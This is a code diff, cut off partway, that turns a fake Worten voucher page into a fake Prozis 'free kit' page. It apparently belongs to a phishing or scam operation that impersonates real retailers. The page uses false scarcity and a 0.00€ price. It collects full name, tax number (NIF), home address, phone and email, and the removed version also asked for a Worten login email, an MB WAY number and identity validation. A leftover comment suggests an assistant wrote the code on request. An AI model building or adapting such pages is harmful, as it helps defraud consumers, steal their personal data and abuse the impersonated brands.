@@ -4,13 +4,11 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Resgate do Prémio - Worten</title>
-    <meta name="description" content="Resgate o seu voucher Worten">
-    <link rel="stylesheet" href="style.css?v=37">
-    <link
-        href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;800&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap"
-        rel="stylesheet">
-    <link rel="icon" href="/assets/worten-logo.svg" type="image/svg+xml">
+    <title>Resgate do Prémio - Prozis</title>
+    <meta name="description" content="Resgate o seu Kit Prozis Grátis">
+    <link rel="stylesheet" href="style.css?v=38">
+    <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="icon" href="assets/prozis-logo.svg" type="image/svg+xml">
 
     <!-- Meta Pixel Code -->
     <script>
@@ -26,8 +24,6 @@
         }(window, document, 'script',
             'https://connect.facebook.net/en_US/fbevents.js');
         fbq('init', '944451194573600');
-        // PageView is standard, but the user specifically asked for InitiateCheckout on form fill, not page load.
-        // However, it's good practice to track PageView everywhere for funnel consistency.
         fbq('track', 'PageView');
     </script>
     <noscript><img height="1" width="1" style="display:none"
@@ -36,826 +32,568 @@
 
     <style>
         body {
-            font-family: 'Open Sans', 'Arial', sans-serif;
+            font-family: 'Exo 2', sans-serif;
+            background: #f5f5f5;
+            color: #111;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
         }
 
-        .voucher-img-container {
-            position: relative;
-            display: inline-block;
-            width: 100% !important;
-            max-width: 800px;
-            /* Force much larger card */
-        }
-
-        .voucher-img {
+        /* Prozis Header */
+        header {
+            background: #000;
+            padding: 15px 0;
+            text-align: center;
+            border-bottom: 3px solid #e32526;
             width: 100%;
+        }
+
+        header img {
+            height: 30px;
+        }
+
+        /* Product Container */
+        .product-card {
+            background: white;
+            max-width: 600px;
+            margin: 20px auto;
             border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            padding-bottom: 30px;
         }
 
-        .voucher-value {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-family: 'Open Sans', sans-serif;
-            font-weight: 800;
-            font-size: 42px;
-            color: white;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
-            pointer-events: none;
+        .product-image-area {
+            position: relative;
+            background: #fff;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #eee;
         }
 
-        .continue-btn {
-            width: 100%;
-            padding: 18px;
-            background: #d32f2f;
-            color: white;
+        .product-img {
+            max-width: 100%;
+            height: auto;
+            max-height: 400px;
+        }
+
+        .product-details {
+            padding: 20px 30px;
+            text-align: center;
+        }
+
+        .product-title {
+            font-size: 24px;
             font-weight: 800;
-            border: none;
-            border-radius: 8px;
-            font-size: 18px;
-            cursor: pointer;
-            box-shadow: 0 4px 0 #b71c1c;
             text-transform: uppercase;
-            transition: transform 0.1s, opacity 0.2s;
-            margin-top: 10px;
+            margin-bottom: 15px;
+            color: #000;
+            line-height: 1.2;
         }
 
-        .continue-btn:active {
-            transform: translateY(3px);
-            box-shadow: 0 1px 0 #b71c1c;
+        .price-tag {
+            margin: 15px 0;
         }
 
-        /* Form Grid Layout */
-        .form-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 15px;
+        .old-price {
+            font-size: 18px;
+            text-decoration: line-through;
+            color: #999;
+            margin-right: 10px;
         }
 
-        @media (min-width: 600px) {
-            .form-grid {
-                grid-template-columns: 1fr 1fr;
+        .new-price {
+            font-size: 32px;
+            color: #e32526;
+            font-weight: 800;
+        }
+
+        .stock-warning {
+            color: #e32526;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            display: inline-block;
+            background: rgba(227, 37, 38, 0.1);
+            padding: 5px 15px;
+            border-radius: 20px;
+        }
+
+        .btn-redeem {
+            background: #25a01c;
+            /* Green as requested */
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 20px;
+            font-weight: 800;
+            text-transform: uppercase;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(37, 160, 28, 0.4);
+            transition: all 0.2s;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .btn-redeem:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(37, 160, 28, 0.6);
+            background: #208a18;
+        }
+
+        .description {
+            text-align: left;
+            margin-top: 30px;
+            color: #555;
+            font-size: 14px;
+            line-height: 1.6;
+            padding: 0 10px;
+        }
+
+        .description p {
+            margin-bottom: 15px;
+        }
+
+        .description ul {
+            list-style: none;
+            padding: 0;
+            margin-bottom: 20px;
+        }
+
+        .description li {
+            margin-bottom: 12px;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .description li strong {
+            color: #000;
+        }
+
+        .description small {
+            display: block;
+            color: #999;
+            font-size: 12px;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 100;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 500px;
+            position: relative;
+            animation: slideUp 0.3s ease-out;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(50px);
+                opacity: 0;
             }
 
-            .full-width {
-                grid-column: span 2;
+            to {
+                transform: translateY(0);
+                opacity: 1;
             }
         }
 
-        .input-group label {
+        .modal h3 {
+            margin-top: 0;
+            text-transform: uppercase;
+            font-weight: 800;
+            color: #000;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
             display: block;
             margin-bottom: 5px;
             font-weight: 600;
             font-size: 13px;
-            color: #555;
         }
 
-        .input-group input {
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .flag-icon {
+            position: absolute;
+            left: 10px;
+            width: 24px;
+            height: 24px;
+            z-index: 2;
+        }
+
+        .form-group input {
             width: 100%;
             padding: 12px;
             border: 1px solid #ddd;
-            border-radius: 8px;
-            background: #f9f9f9;
-            font-family: 'Open Sans', sans-serif;
-            box-sizing: border-box;
-            /* Fix padding issue */
-        }
-
-        .radio-group {
-            display: flex;
-            gap: 10px;
-        }
-
-        .radio-option {
-            flex: 1;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            text-align: center;
-            cursor: pointer;
-            font-size: 13px;
-            background: #f9f9f9;
-        }
-
-        /* --- GENERATION ANIMATION STYLES (CLEAN THEME) --- */
-        .form-container {
-            opacity: 0;
-            transform: translateY(20px);
-            transition: opacity 0.8s ease, transform 0.8s ease;
-            pointer-events: none;
-            margin-bottom: 50px;
-            /* Added spacing from footer */
-        }
-
-        .form-container.visible {
-            opacity: 1;
-            transform: translateY(0);
-            pointer-events: auto;
-        }
-
-        #generation-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.95);
-            /* Clean Professional White */
-            border-radius: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 10;
-            backdrop-filter: blur(5px);
-            border: 1px solid #eee;
-        }
-
-        .gen-spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #d32f2f;
-            /* Worten Red */
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 25px;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .gen-text {
-            color: #333;
-            font-family: 'Open Sans', sans-serif;
-            font-weight: 700;
-            font-size: 16px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        /* Cursor Blink Effect */
-        .cursor-blink {
-            animation: blink 1s step-end infinite;
-        }
-
-        @keyframes blink {
-
-            0%,
-            100% {
-                opacity: 1;
-            }
-
-            50% {
-                opacity: 0;
-            }
-        }
-
-        #voucher-code-display {
-            font-family: 'Space Mono', monospace;
-            /* Gift card style font */
-            font-size: 26px;
-            /* Increased for impact */
-            white-space: nowrap;
-            color: #333;
-            /* Darker for contrast like printed text */
-            font-weight: 700;
-            margin-top: 15px;
-            letter-spacing: 3px;
-            display: none;
-            background: #f0f0f0;
-            /* Slight gray for card background */
-            padding: 12px 20px;
             border-radius: 6px;
-            border: 1px solid #ccc;
-            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.1);
-            /* Inset effect */
+            font-family: 'Exo 2', sans-serif;
+            font-size: 15px;
+            box-sizing: border-box;
         }
 
-        @keyframes scan {
-            0% {
-                top: 0%;
-                opacity: 0;
-            }
-
-            50% {
-                opacity: 1;
-                box-shadow: 0 0 20px #4CAF50;
-            }
-
-            100% {
-                top: 100%;
-                opacity: 0;
-            }
+        .input-with-icon {
+            padding-left: 45px !important;
         }
 
-        .scan-line {
+        .form-group input:focus {
+            outline: none;
+            border-color: #25a01c;
+        }
+
+        .close-modal {
             position: absolute;
-            left: 0;
+            top: 15px;
+            right: 20px;
+            font-size: 24px;
+            cursor: pointer;
+            color: #999;
+        }
+
+        /* Footer override */
+        footer {
+            background: #000;
+            color: white;
+            padding: 40px 20px;
+            text-align: center;
+            margin-top: auto;
             width: 100%;
-            height: 2px;
-            background: #4CAF50;
-            z-index: 5;
-            animation: scan 2s ease-in-out infinite;
-            display: none;
+        }
+
+        footer p {
+            font-size: 12px;
+            opacity: 0.7;
+            margin: 0;
         }
     </style>
 </head>
 
 <body>
-    <!-- Header Minimalista -->
-    <div id="worten-header" style="text-align: center; padding: 20px;">
-        <img id="worten-logo" src="/assets/worten-logo.svg"
-            style="width: 140px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));">
-    </div>
 
-    <div class="main-container" style="max-width: 900px; margin: 0 auto; width: 95%;">
+    <header>
+        <img src="assets/prozis-logo.svg" alt="Prozis">
+    </header>
 
-        <!-- Instruction Header (Visible Feedback) -->
-        <!-- Instruction Header (Visible Feedback) -->
-        <div id="instruction-text"
-            style="text-align: center; color: #fff; font-weight: 700; margin-bottom: 20px; font-size: 16px; min-height: 30px; text-shadow: 0 2px 4px rgba(0,0,0,0.5);">
-            <!-- Dynamic Text Here -->
+    <div class="product-card">
+        <div class="product-image-area">
+            <img src="assets/prozispremio.png" alt="Kit Completo Prozis" class="product-img">
         </div>
 
-        <!-- Voucher Card Showcase -->
-        <div class="voucher-card" style="text-align: center; position: relative; margin-bottom: 30px;">
+        <div class="product-details">
+            <h1 class="product-title">🏋️ Kit Completo Prozis – Nutrição & Performance</h1>
 
-            <!-- Glow Effect Behind Image -->
-            <div
-                style="position: absolute; top: 35%; left: 50%; transform: translate(-50%, -50%); width: 300px; height: 180px; background: rgba(255,255,255,0.25); filter: blur(40px); border-radius: 50%; z-index: 0; pointer-events: none;">
+            <div class="price-tag">
+                <span class="old-price">199.99€</span>
+                <span class="new-price">0.00€</span>
             </div>
 
-            <div class="voucher-img-container"
-                style="position: relative; z-index: 1; max-width: 450px; width: 85%; margin: 0 auto; filter: drop-shadow(0 20px 40px rgba(0,0,0,0.5));">
-                <img src="voucher.png" class="voucher-img" alt="Voucher Worten"
-                    style="width: 100%; border-radius: 20px;">
+            <div class="stock-warning">⚠️ Apenas 3 unidades restantes</div>
 
-                <!-- Scratch Card Area (Integrated) -->
-                <div id="scratch-wrapper"
-                    style="position: absolute; top: 73%; left: 50%; transform: translate(-50%, -50%); width: 60%; height: 18%; display: none; overflow: hidden; border-radius: 6px;">
-                    <!-- The Secret Code (Underneath - Transparent Background) -->
-                    <div id="voucher-code-display"
-                        style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.9); margin: 0; border: none;">
-                        <div
-                            style="font-family: 'Courier New', monospace; font-size: 24px; color: #000; font-weight: 900; letter-spacing: 2px;">
-                            WR-500-XXXX
-                        </div>
-                    </div>
-                    <!-- The Scratch Layer (On Top) -->
-                    <canvas id="scratch-canvas" class="responsive-canvas"
-                        style="position: absolute; top: 0; left: 0; z-index: 2; cursor: pointer; touch-action: none; width: 100%; height: 100%;"></canvas>
-                </div>
-            </div>
+            <button class="btn-redeem" onclick="openModal()">RESGATAR AGORA</button>
 
-            <!-- Scan Effect -->
-            <div class="scan-line" id="scanLine"></div>
+            <div class="description">
+                <p>Kit completo com suplementos, alimentos proteicos e acessório essencial, ideal para melhorar o
+                    desempenho, apoiar a recuperação muscular e trazer mais praticidade ao dia a dia.</p>
 
-            <!-- Generation Overlay -->
-            <div id="generation-overlay">
-                <div class="gen-spinner" id="genSpinner"></div>
-                <div class="gen-text" id="genText">A estabelecer ligação segura...</div>
+                <h4 style="text-transform:uppercase; font-weight:700; color:#000; margin-bottom: 10px;">O que inclui:
+                </h4>
+                <ul>
+                    <li>
+                        <strong>100% Whey Hydro Isolate PRO 2000 g</strong> – proteína whey hidrolisada, de rápida
+                        absorção<br>
+                        <small>Preço antigo: ~94,99 €</small>
+                    </li>
+                    <li>
+                        <strong>Creatina MicronPure®️ 300 g</strong> – creatina monohidratada 100% pura e
+                        micronizada<br>
+                        <small>Preço antigo: ~38,99 €</small>
+                    </li>
+                    <li>
+                        <strong>Hot Cocoa Whey Protein 400 g</strong> – sabor Bolacha – bebida quente com proteína
+                        whey<br>
+                        <small>Preço antigo: ~12,99 €</small>
+                    </li>
+                    <li>
+                        <strong>Superb Granola 275 g</strong> – Chocolate de Leite e Avelã – granola crocante e
+                        saborosa<br>
+                        <small>Preço antigo: ~4,99 €</small>
+                    </li>
+                    <li>
+                        <strong>Peanut Butter 1000 g</strong> – 100% Amendoim – manteiga de amendoim natural, sem
+                        açúcares adicionados<br>
+                        <small>Preço antigo: ~7,99 €</small>
+                    </li>
+                    <li>
+                        <strong>Whey Choco Butter Duo 200 g</strong> – Cacau & Avelã – creme proteico para barrar<br>
+                        <small>Preço antigo: ~5,99 €</small>
+                    </li>
+                    <li>
+                        <strong>Real Protein Bar (x8)</strong> – Bolacha com Recheio de Chocolate – barras proteicas
+                        práticas para o dia a dia<br>
+                        <small>Preço antigo: ~14,99 €</small>
+                    </li>
+                    <li>
+                        <strong>Garrafa Neo Mixer 3.0</strong> – Tritan Neon Red – shaker resistente e prático<br>
+                        <small>Preço antigo: ~19,99 €</small>
+                    </li>
+                </ul>
 
-                <!-- Wrapper Moved to Image Container -->
-            </div>
+                <p><strong>Ideal para:</strong> treino, recuperação muscular e alimentação prática.<br>
+                    Grande variedade, excelente valor e tudo num só kit. 💪🔥</p>
 
-            <h2
-                style="position: relative; z-index: 1; color: white; font-weight: 800; font-size: 32px; margin-top: 25px; margin-bottom: 5px; font-family: 'Open Sans', 'Arial', sans-serif; text-shadow: 0 2px 4px rgba(0,0,0,0.3);">
-                VOUCHER 500€</h2>
-            <p
-                style="position: relative; z-index: 1; color: white; font-weight: 600; font-size: 16px; opacity: 0.9; font-family: 'Open Sans', 'Arial', sans-serif;">
-                Válido em worten.pt e lojas físicas</p>
-        </div>
-
-        <div style="display: flex; flex-wrap: wrap; gap: 20px; justify-content: center;">
-
-            <!-- Benefits List (Horizontal on Wide) -->
-            <div class="benefits-list"
-                style="flex: 1 1 300px; display: flex; flex-direction: column; gap: 15px; margin-bottom: 30px; color: white; font-family: 'Open Sans', sans-serif;">
-                <div class="benefit-item"
-                    style="display: flex; align-items: center; gap: 15px; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 10px;">
-                    <div
-                        style="background: #fff; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
-                        <!-- Icon: Shopping Bag -->
-                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#d32f2f" stroke-width="2">
-                            <path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"></path>
-                            <line x1="3" y1="6" x2="21" y2="6"></line>
-                            <path d="M16 10a4 4 0 0 1-8 0"></path>
-                        </svg>
-                    </div>
-                    <div>
-                        <h4 style="font-weight: 700; margin: 0;">Válido em Toda a Loja</h4>
-                        <p style="font-size: 12px; opacity: 0.9; margin: 2px 0 0;">Utiliza em qualquer produto, sem
-                            restrições.</p>
-                    </div>
-                </div>
-
-                <div class="benefit-item"
-                    style="display: flex; align-items: center; gap: 15px; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 10px;">
-                    <div
-                        style="background: #fff; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
-                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#d32f2f" stroke-width="2">
-                            <rect x="1" y="3" width="15" height="13"></rect>
-                            <polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon>
-                            <circle cx="5.5" cy="18.5" r="2.5"></circle>
-                            <circle cx="18.5" cy="18.5" r="2.5"></circle>
-                        </svg>
-                    </div>
-                    <div>
-                        <h4 style="font-weight: 700; margin: 0;">Envio Gratuito</h4>
-                        <p style="font-size: 12px; opacity: 0.9; margin: 2px 0 0;">Frete grátis incluído na tua
-                            encomenda.
-                        </p>
-                    </div>
-                </div>
-
-                <div class="benefit-item"
-                    style="display: flex; align-items: center; gap: 15px; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 10px;">
-                    <div
-                        style="background: #fff; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
-                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#d32f2f" stroke-width="2">
-                            <circle cx="12" cy="12" r="10"></circle>
-                            <polyline points="12 6 12 12 16 14"></polyline>
-                        </svg>
-                    </div>
-                    <div>
-                        <h4 style="font-weight: 700; margin: 0;">Ativo em até 2 Horas</h4>
-                        <p style="font-size: 12px; opacity: 0.9; margin: 2px 0 0;">Voucher pessoal e intransferível
-                            (associado ao NIF).</p>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Form Section -->
-            <div class="form-container"
-                style="flex: 1 1 400px; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); font-family: 'Open Sans', 'Arial', sans-serif;">
-                <h3 style="color: #333; text-align: center; margin-bottom: 25px; font-weight: 700; font-size: 22px;">
-                    Dados para Ativação</h3>
-
-                <form id="claimForm" class="form-grid">
-                    <div class="input-group full-width">
-                        <label>Nome Completo</label>
-                        <input type="text" required placeholder="Como no Cartão de Cidadão">
-                    </div>
-
-                    <div class="input-group">
-                        <label>NIF (Para fatura)</label>
-                        <input type="tel" required maxlength="9" placeholder="NIF (9 dígitos)"
-                            oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1').slice(0, 9);">
-                    </div>
-
-                    <div class="input-group">
-                        <label>Telemóvel (MB WAY)</label>
-                        <div
-                            style="display: flex; align-items: center; border: 1px solid #ddd; border-radius: 8px; background: #f9f9f9; padding: 0 12px;">
-                            <!-- PT Flag SVG -->
-                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 480" width="24" height="18"
-                                style="flex-shrink: 0; box-shadow: 0 1px 2px rgba(0,0,0,0.2);">
-                                <g fill-rule="evenodd" stroke-width="1pt">
-                                    <path fill="#e03c31" d="M213.3 0H640v480H213.3z" />
-                                    <path fill="#046a38" d="M0 0h213.3v480H0z" />
-                                    <path fill="#ff0" d="M213.3 240a85.3 85.3 0 1 0-170.6 0 85.3 85.3 0 0 0 170.6 0Z"
-                                        transform="matrix(.55 0 0 .55 96 108)" />
-                                </g>
-                                <path fill="#e03c31" d="M213.3 226.7v26.6h26.7a13.3 13.3 0 0 0 0-26.6h-26.7Z"
-                                    transform="matrix(1.5 0 0 1.5 -106 -110)" />
-                                <!-- Simplified Shield for small size -->
-                                <path fill="none" stroke="#fff" stroke-width="30" d="M213 180v120"
-                                    transform="scale(0.5) translate(213, 0)" />
-                            </svg>
-                            <span style="font-weight: 600; color: #333; margin: 0 8px;">+351</span>
-                            <input type="tel" id="userPhone" required placeholder="9xx xxx xxx"
-                                style="border: none; background: transparent; padding: 12px 0; outline: none; flex: 1;">
-                        </div>
-                    </div>
-
-                    <div class="input-group full-width">
-                        <label>Email (Login Worten)</label>
-                        <input type="email" id="userEmail" required placeholder="teu.email@exemplo.com"
-                            list="email-providers">
-                        <datalist id="email-providers">
-                            <option value="@gmail.com">
-                            <option value="@hotmail.com">
-                            <option value="@outlook.pt">
-                            <option value="@sapo.pt">
-                            <option value="@icloud.com">
-                        </datalist>
-                    </div>
-
-                    <button type="submit" class="continue-btn full-width">
-                        CONTINUAR
-                    </button>
-                </form>
+                <p style="font-size: 13px; margin-top: 20px; border-top: 1px solid #eee; padding-top: 10px;">
+                    <strong>Envio Expresso:</strong> Receba o seu kit em 24-48h úteis diretamente em sua casa.
+                </p>
             </div>
         </div>
     </div>
 
-    <!-- Official Footer -->
-    <footer class="worten-footer">
-        <img src="/assets/worten-logo.svg" class="footer-logo" alt="Worten">
-        <div class="footer-content">
-            <div class="footer-col">
-                <h4>Apoio ao Cliente</h4>
-                <ul>
-                    <li><a href="#">Ajuda e Contactos</a></li>
-                    <li><a href="#">Estado da Encomenda</a></li>
-                    <li><a href="#">Devoluções</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Sobre Nós</h4>
-                <ul>
-                    <li><a href="#">Quem somos</a></li>
-                    <li><a href="#">Lojas</a></li>
-                    <li><a href="#">Worten Resolve</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Links Úteis</h4>
-                <ul>
-                    <li><a onclick="openLegal('privacy')">Política de Privacidade</a></li>
-                    <li><a onclick="openLegal('terms')">Termos e Condições</a></li>
-                    <li><a href="#">Livro de Reclamações</a></li>
-                </ul>
-            </div>
-        </div>
-        <div class="footer-bottom">
-            <p>© 2024 Worten - Equipamentos para o Lar, S.A. Todos os direitos reservados.</p>
-        </div>
+    <footer>
+        <img src="assets/prozis-logo.svg"
+            style="height: 20px; opacity: 1; margin-bottom: 10px; filter: brightness(0) invert(1);">
+        <p>© 2024 Prozis.com. Todos os direitos reservados.</p>
+        <p>Preços e promoções sujeitos a alteração. IVA incluído à taxa legal.</p>
     </footer>
 
-    <!-- Code Revealed Modal -->
-    <div id="codeRevealedModal" class="legal-modal">
-        <div class="legal-content" style="text-align: center; max-width: 450px;">
-            <div style="margin-bottom: 20px;">
-                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#4CAF50" stroke-width="3"
-                    stroke-linecap="round" stroke-linejoin="round">
-                    <polyline points="20 6 9 17 4 12"></polyline>
-                </svg>
-            </div>
-            <h2 style="color: #333; margin-bottom: 10px; font-weight: 800; font-family: 'Open Sans', sans-serif;">CÓDIGO
-                GERADO</h2>
-            <p style="color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 25px;">
-                O voucher foi gerado, mas necessita de <strong>ativação</strong>.<br><br>
-                A validação de identidade é obrigatória para prevenir fraudes. Após validação, a ativação pode demorar
-                até <strong>2 horas</strong>.
+    <!-- Redemption Modal -->
+    <div id="redemptionModal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal()">&times;</span>
+            <h3>Dados de Envio</h3>
+            <p style="text-align: center; font-size: 14px; color: #666; margin-bottom: 20px;">
+                Preencha os dados onde deseja receber o seu <strong>Kit Grátis</strong>.
             </p>
-            <button onclick="closeRevealedModal()" style="
-                background: #d32f2f; color: white; border: none; padding: 15px 35px;
-                border-radius: 50px; font-weight: 700; font-size: 15px; cursor: pointer; width: 100%;
-                text-transform: uppercase; box-shadow: 0 4px 10px rgba(211, 47, 47, 0.2); letter-spacing: 1px;
-            ">VALIDAR IDENTIDADE</button>
+
+            <form id="shippingForm" onsubmit="submitForm(event)">
+                <div class="form-group">
+                    <label>Nome Completo</label>
+                    <div class="input-wrapper">
+                        <div class="flag-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                                <circle cx="12" cy="7" r="4"></circle>
+                            </svg>
+                        </div>
+                        <input type="text" name="name" required placeholder="Ex: João Silva" class="input-with-icon">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>NIF (Número de Contribuinte)</label>
+                    <div class="input-wrapper">
+                        <div class="flag-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="3" y="4" width="18" height="16" rx="2"></rect>
+                                <line x1="7" y1="8" x2="17" y2="8"></line>
+                                <line x1="7" y1="12" x2="17" y2="12"></line>
+                                <line x1="7" y1="16" x2="17" y2="16"></line>
+                            </svg>
+                        </div>
+                        <input type="tel" name="nif" required pattern="[0-9]{9}" maxlength="9" placeholder="123456789"
+                            class="input-with-icon">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Morada de Entrega</label>
+                    <div class="input-wrapper">
+                        <div class="flag-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                                <polyline points="9 22 9 12 15 12 15 22"></polyline>
+                            </svg>
+                        </div>
+                        <input type="text" name="address" required placeholder="Ex: Rua da Liberdade, 123"
+                            class="input-with-icon">
+                    </div>
+                </div>
+
+                <div style="display: flex; gap: 10px;">
+                    <div class="form-group" style="flex: 1;">
+                        <label>Código Postal</label>
+                        <div class="input-wrapper">
+                            <div class="flag-icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                    stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                                    <circle cx="12" cy="10" r="3"></circle>
+                                </svg>
+                            </div>
+                            <input type="tel" id="zipInput" name="zip" required placeholder="0000-000" maxlength="8"
+                                class="input-with-icon">
+                        </div>
+                    </div>
+                    <div class="form-group" style="flex: 1;">
+                        <label>Cidade</label>
+                        <div class="input-wrapper">
+                            <div class="flag-icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                    stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M3 21h18"></path>
+                                    <path d="M5 21V7l8-4 8 4v14"></path>
+                                    <path d="M17 21v-8H7v8"></path>
+                                </svg>
+                            </div>
+                            <input type="text" name="city" required placeholder="Ex: Lisboa" class="input-with-icon">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Telemóvel (Para notificações)</label>
+                    <div class="input-wrapper">
+                        <!-- PT Flag SVG -->
+                        <div class="flag-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+                                <g fill="none">
+                                    <path fill="#046200" d="M0 0h170.7v512H0z" />
+                                    <path fill="#D21034" d="M170.7 0h341.3v512H170.7z" />
+                                    <g transform="translate(149.3 149.3)">
+                                        <path fill="#F2C500"
+                                            d="M85.3 0c-35.3 0-64 28.7-64 64v10.7h20.8V64c0-23.8 19.3-43.2 43.2-43.2s43.2 19.3 43.2 43.2v10.7h20.8V64c0-35.3-28.7-64-64-64z" />
+                                        <path fill="#FFF"
+                                            d="M42.7 74.7H128V149c0 23.6-19.1 42.7-42.7 42.7S42.7 172.6 42.7 149V74.7z" />
+                                        <path fill="#0F3398" d="M64 106.7h42.7v21.3H64z" />
+                                        <path fill="#FFF" d="M85.3 106.7H106.7v21.3H85.3z" />
+                                        <path fill="#0F3398" d="M64 128h21.3v21.3H64z" />
+                                        <path fill="#FFF" d="M85.3 128H106.7v21.3H85.3z" />
+                                        <path fill="#0F3398" d="M96 149.3h21.3v21.3H96z" />
+                                    </g>
+                                </g>
+                            </svg>
+                        </div>
+                        <input type="tel" id="phoneInput" name="phone" required placeholder="912 345 678"
+                            class="input-with-icon" maxlength="13">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Email</label>
+                    <div class="input-wrapper">
+                        <div class="flag-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#666"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z">
+                                </path>
+                                <polyline points="22,6 12,13 2,6"></polyline>
+                            </svg>
+                        </div>
+                        <input type="email" name="email" required placeholder="Ex: joao@email.com"
+                            class="input-with-icon">
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-redeem" style="font-size: 16px; padding: 15px;">
+                    CONFIRMAR ENVIO
+                </button>
+            </form>
         </div>
     </div>
-
-    <!-- Legal Modals -->
-    <div id="legalModal" class="legal-modal">
-        <div class="legal-content">
-            <span class="close-legal" onclick="closeLegal()">&times;</span>
